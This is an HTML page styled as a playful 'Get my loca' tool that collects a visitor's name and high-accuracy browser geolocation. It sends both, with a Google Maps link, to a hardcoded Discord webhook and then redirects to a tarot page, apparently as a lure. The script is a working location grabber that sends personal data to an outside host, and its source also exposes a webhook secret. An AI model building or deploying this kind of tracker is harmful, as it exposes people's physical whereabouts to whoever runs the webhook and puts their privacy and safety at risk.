<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>My loca | By Champion!!</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    body {
      background: radial-gradient(circle at center, #0f0f0f, #000);
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      text-align: center;
      padding-top: 120px;
      user-select: none;
    }
    h1 {
      font-size: 3.5rem;
      letter-spacing: 0.25em;
      text-shadow: 0 0 8px #00ff00, 0 0 16px #00ff00;
      animation: flicker 3s infinite;
    }
    input, button {
      font-family: 'Share Tech Mono', monospace;
    }
    #nameInput {
      padding: 12px 20px;
      font-size: 1.4rem;
      width: 300px;
      background: transparent;
      border: 2px solid #00ff00;
      color: #00ff00;
      border-radius: 6px;
      box-shadow: 0 0 8px #00ff00;
      outline: none;
      letter-spacing: 0.05em;
    }
    #nameInput::placeholder { color: #004400; }
    #locateBtn {
      margin-top: 1rem;
      background: transparent;
      border: 2px solid #00ff00;
      padding: 18px 40px;
      font-size: 1.8rem;
      color: #00ff00;
      cursor: not-allowed;
      border-radius: 8px;
      box-shadow: 0 0 8px #00ff00, inset 0 0 6px #00ff00;
      transition: background 0.3s ease, color 0.3s ease;
      font-weight: 700;
      letter-spacing: 0.1em;
    }
    #locateBtn.enabled {
      cursor: pointer;
    }
    #locateBtn.enabled:hover {
      background: #00ff00;
      color: #000;
      box-shadow: 0 0 16px #00ff00, inset 0 0 12px #00ff00;
    }
    @keyframes flicker {
      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
      20%, 22%, 24%, 55% { opacity: 0.5; }
    }
  </style>
</head>
<body>

  <h1>My loca</h1>

  <input id="nameInput" type="text" placeholder="ENTER YOUR NAME" />
  <br>
  <button id="locateBtn" disabled>Get my loca</button>
  <p id="output" aria-live="polite"></p> <!-- ‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏µ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÅ‡∏™‡∏î‡∏á‡∏ú‡∏• -->

  <script>
    const nameInput = document.getElementById('nameInput');
    const locateBtn = document.getElementById('locateBtn');
    const output = document.getElementById('output');

    nameInput.addEventListener('input', () => {
      const name = nameInput.value.trim();
      if (name.length >= 2 && /^[\w‡∏Å-‡πô ]+$/u.test(name)) {
        locateBtn.disabled = false;
        locateBtn.classList.add('enabled');
      } else {
        locateBtn.disabled = true;
        locateBtn.classList.remove('enabled');
      }
    });

    locateBtn.addEventListener('click', () => {
      const name = nameInput.value.trim();

      if (!navigator.geolocation) {
        output.textContent = '‚ùå Your browser does not support Geolocation.';
        return;
      }

      locateBtn.disabled = true;
      locateBtn.textContent = 'LOCA..is...';
      output.textContent = '‚è≥ Getting You Card...';

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;

          output.innerHTML =
            `‚úÖ Name: ${name}<br>` +
            `üì§ Sending to Champ!!!...`;

          try {
            await sendToDiscord(name, latitude, longitude);
            output.innerHTML += `<br>‚úÖ Sent location to champ complete!`;
            // redirect ‡∏´‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡πÄ‡∏™‡∏£‡πá‡∏à
            setTimeout(() => {
              window.location.href = "tarot.html";
            }, 1500);
          } catch {
            output.innerHTML += `<br>‚ùå Failed to send.`;
            locateBtn.disabled = false;
            locateBtn.textContent = 'Get my loca';
          }
        },
        (err) => {
          let msg = '‚ùå Location error.';
          if (err.code === err.PERMISSION_DENIED) msg = '‚ö†Ô∏è Permission denied.';
          else if (err.code === err.POSITION_UNAVAILABLE) msg = '‚ö†Ô∏è Location unavailable.';
          else if (err.code === err.TIMEOUT) msg = '‚ö†Ô∏è Timeout.';
          output.textContent = msg;
          locateBtn.disabled = false;
          locateBtn.textContent = 'Get my loca';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });

    async function sendToDiscord(name, lat, lng) {
      const webhook = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
      const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
      const msg = {
        content: `üì• **New Location Captured**\nüë§ Name: ${safeName}\nüìç https://maps.google.com/?q=${lat},${lng}`
      };
      const res = await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      });
      if (!res.ok) throw new Error("Send failed");
    }
  </script>

</body>
</html>
